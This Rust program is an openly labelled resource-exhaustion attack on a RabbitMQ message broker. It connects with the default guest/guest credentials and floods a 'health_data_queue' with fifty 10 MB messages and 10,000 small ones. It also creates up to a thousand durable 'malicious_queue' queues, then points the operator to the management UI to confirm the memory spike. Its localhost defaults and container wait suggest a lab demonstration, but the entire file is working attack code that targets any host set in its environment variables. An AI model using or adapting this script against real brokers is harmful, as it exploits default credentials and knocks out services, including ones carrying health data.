use lapin::{
    options::*, types::FieldTable, BasicProperties, Connection, ConnectionProperties,
};
use std::env;
use std::io::{self, Write};
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() {
    // Force immediate output flushing
    let _ = io::stdout().flush();
    
    if let Err(e) = run().await {
        eprintln!("ERROR: {}", e);
        let _ = io::stderr().flush();
        std::process::exit(1);
    }
}

async fn run() -> Result<(), Box<dyn std::error::Error>> {
    println!("Resource Exhaustion Attack");
    println!("=========================================\n");
    io::stdout().flush()?;

    let host = env::var("RABBITMQ_HOST").unwrap_or_else(|_| "localhost".to_string());
    let port = env::var("RABBITMQ_PORT").unwrap_or_else(|_| "5672".to_string());

    // Exploit default credentials
    let user = env::var("RABBITMQ_USER").unwrap_or_else(|_| "guest".to_string());
    let pass = env::var("RABBITMQ_PASS").unwrap_or_else(|_| "guest".to_string());

    let amqp_url = format!("amqp://{}:{}@{}:{}", user, pass, host, port);
    
    println!("Target: {}:{}", host, port);
    println!("Using credentials: {}/{}\n", user, pass);
    io::stdout().flush()?;

    println!("Connecting to RabbitMQ...");
    io::stdout().flush()?;
    
    let conn = Connection::connect(&amqp_url, ConnectionProperties::default()).await?;
    let channel = conn.create_channel().await?;

    println!("Connected!\n");
    io::stdout().flush()?;

    // ATTACK 1: Huge messages
    println!("Attack 1: Sending huge messages (10MB each)");
    io::stdout().flush()?;
    
    for i in 1..=50 {
        let huge_payload = vec![0u8; 10_000_000]; // 10MB
        
        match channel
            .basic_publish(
                "",
                "health_data_queue",
                BasicPublishOptions::default(),
                &huge_payload,
                BasicProperties::default(),
            )
            .await
        {
            Ok(_) => {
                println!("   Sent huge message #{} (10 MB)", i);
                io::stdout().flush()?;
            }
            Err(e) => {
                println!("   Error: {}", e);
                io::stdout().flush()?;
            }
        }
        
        sleep(Duration::from_millis(200)).await;
    }

    println!("\nAttack 2: Creating thousands of queues");
    io::stdout().flush()?;
    
    for i in 1..=1000 {
        let queue_name = format!("malicious_queue_{}", i);
        
        match channel
            .queue_declare(
                &queue_name,
                QueueDeclareOptions {
                    durable: true,
                    ..Default::default()
                },
                FieldTable::default(),
            )
            .await
        {
            Ok(_) => {
                if i % 100 == 0 {
                    println!("   Created {} malicious queues", i);
                    io::stdout().flush()?;
                }
            }
            Err(e) => {
                println!("   Error after {} queues: {}", i, e);
                io::stdout().flush()?;
                break;
            }
        }
    }

    println!("\nAttack 3: Message flooding (10,000 messages)");
    io::stdout().flush()?;
    
    for i in 1..=10000 {
        let payload = format!("Attack message #{}", i);
        
        match channel
            .basic_publish(
                "",
                "health_data_queue",
                BasicPublishOptions::default(),
                payload.as_bytes(),
                BasicProperties::default(),
            )
            .await
        {
            Ok(_) => {
                if i % 1000 == 0 {
                    println!("   Sent {} messages", i);
                    io::stdout().flush()?;
                }
            }
            Err(e) => {
                println!("   Error after {} messages: {}", i, e);
                io::stdout().flush()?;
                break;
            }
        }
    }

    println!("\n========================================");
    println!("Attack finished!");
    println!("========================================");
    println!("Check RabbitMQ Management UI at http://localhost:15672");
    println!("  Username: guest");
    println!("  Password: guest");
    println!("\nLook for:");
    println!("  - Hundreds of 'malicious_queue_*' queues");
    println!("  - 'health_data_queue' with 10,000+ messages");
    println!("  - Memory usage spike in Overview tab\n");
    io::stdout().flush()?;

    // Keep container alive so you can see logs
    println!("Keeping container alive for 60 seconds...");
    io::stdout().flush()?;
    sleep(Duration::from_secs(60)).await;

    Ok(())
}